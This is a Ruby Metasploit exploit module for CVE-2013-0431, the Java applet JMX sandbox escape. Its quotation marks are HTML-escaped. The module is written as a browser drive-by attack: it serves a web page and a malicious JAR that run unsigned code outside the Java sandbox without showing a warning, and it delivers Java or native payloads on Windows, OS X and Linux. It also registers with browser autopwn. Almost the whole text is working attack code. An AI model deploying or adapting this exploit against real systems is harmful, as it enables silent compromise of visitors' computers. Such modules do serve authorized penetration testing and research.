require &#039;rex&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::HttpServer::HTML
    include Msf::Exploit::EXE
 
    include Msf::Exploit::Remote::BrowserAutopwn
    autopwn_info({ :javascript => false })
 
    def initialize( info = {} )
 
        super( update_info( info,
            &#039;Name&#039;          => &#039;Java Applet JMX Remote Code Execution&#039;,
            &#039;Description&#039;   => %q{
                    This module abuses the JMX classes from a Java Applet to run arbitrary Java code
                outside of the sandbox as exploited in the wild in February of 2013. Additionally,
                this module bypasses default security settings introduced in Java 7 Update 10 to run
                unsigned applet without displaying any warning to the user.
            },
            &#039;License&#039;       => MSF_LICENSE,
            &#039;Author&#039;        =>
                [
                    &#039;Unknown&#039;, # Vulnerability discovery and exploit in the wild
                    &#039;Adam Gowdiak&#039;, # Vulnerability discovery
                    &#039;SecurityObscurity&#039;, # Exploit analysis and deobfuscation
                    &#039;juan vazquez&#039; # Metasploit module
                ],
            &#039;References&#039;    =>
                [
                    [ &#039;CVE&#039;, &#039;2013-0431&#039; ],
                    [ &#039;OSVDB&#039;, &#039;89613&#039; ],
                    [ &#039;BID&#039;, &#039;57726&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.security-explorations.com/materials/SE-2012-01-ORACLE-8.pdf&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.security-explorations.com/materials/SE-2012-01-ORACLE-9.pdf&#039; ],
                    [ &#039;URL&#039;, &#039;http://security-obscurity.blogspot.com.es/2013/01/about-new-java-0-day-vulnerability.html&#039; ],
                    [ &#039;URL&#039;, &#039;http://pastebin.com/QWU1rqjf&#039; ],
                    [ &#039;URL&#039;, &#039;http://malware.dontneedcoffee.com/2013/02/cve-2013-0431-java-17-update-11.html&#039; ]
                ],
            &#039;Platform&#039;      => [ &#039;java&#039;, &#039;win&#039;, &#039;osx&#039;, &#039;linux&#039; ],
            &#039;Payload&#039;       => { &#039;Space&#039; => 20480, &#039;BadChars&#039; => &#039;&#039;, &#039;DisableNops&#039; => true },
            &#039;Targets&#039;       =>
                [
                    [ &#039;Generic (Java Payload)&#039;,
                        {
                            &#039;Platform&#039; => [&#039;java&#039;],
                            &#039;Arch&#039; => ARCH_JAVA,
                        }
                    ],
                    [ &#039;Windows x86 (Native Payload)&#039;,
                        {
                            &#039;Platform&#039; => &#039;win&#039;,
                            &#039;Arch&#039; => ARCH_X86,
                        }
                    ],
                    [ &#039;Mac OS X x86 (Native Payload)&#039;,
                        {
                            &#039;Platform&#039; => &#039;osx&#039;,
                            &#039;Arch&#039; => ARCH_X86,
                        }
                    ],
                    [ &#039;Linux x86 (Native Payload)&#039;,
                        {
                            &#039;Platform&#039; => &#039;linux&#039;,
                            &#039;Arch&#039; => ARCH_X86,
                        }
                    ],
                ],
            &#039;DefaultTarget&#039;  => 0,
            &#039;DisclosureDate&#039; => &#039;Jan 19 2013&#039;
        ))
    end
 
    def on_request_uri(cli, request)
        print_status("handling request for #{request.uri}")
 
        case request.uri
        when /\.jar$/i
            print_status("Sending JAR")
            send_response( cli, generate_jar, { &#039;Content-Type&#039; => "application/octet-stream" } )
        when /\/$/
            print_status("Sending HTML")
            send_response_html(cli, generate_html, { &#039;Content-Type&#039; => &#039;text/html&#039; })
        else
            send_redirect(cli, get_resource() + &#039;/&#039;, &#039;&#039;)
        end
    end
 
    def generate_jar
        paths = [
            [ "Exploit.ser" ],
            [ "Exploit.class" ],
            [ "B.class" ]
        ]
 
        p = regenerate_payload(cli)
 
        jar  = p.encoded_jar
 
        paths.each do |path|
            1.upto(path.length - 1) do |idx|
                full = path[0,idx].join("/") + "/"
                if !(jar.entries.map{|e|e.name}.include?(full))
                    jar.add_file(full, &#039;&#039;)
                end
            end
            fd = File.open(File.join( Msf::Config.install_root, "data", "exploits", "cve-2013-0431", path ), "rb")
            data = fd.read(fd.stat.size)
            jar.add_file(path.join("/"), data)
            fd.close
        end
        return  jar.pack
    end
 
    def generate_html
        html = <<-EOF
<html>
<script language="Javascript">
 
var _app = navigator.appName;
 
if (_app == &#039;Microsoft Internet Explorer&#039;) {
document.write(&#039;<applet archive="#{rand_text_alpha(4+rand(4))}.jar" object="Exploit.ser"></applet>&#039;);
} else {
document.write(&#039;<embed object="Exploit.ser" type="application/x-java-applet;version=1.6" archive="#{rand_text_alpha(4+rand(4))}.jar"></embed>&#039;);
}
 
</script>
</html>
        EOF
        return html
    end
 
end

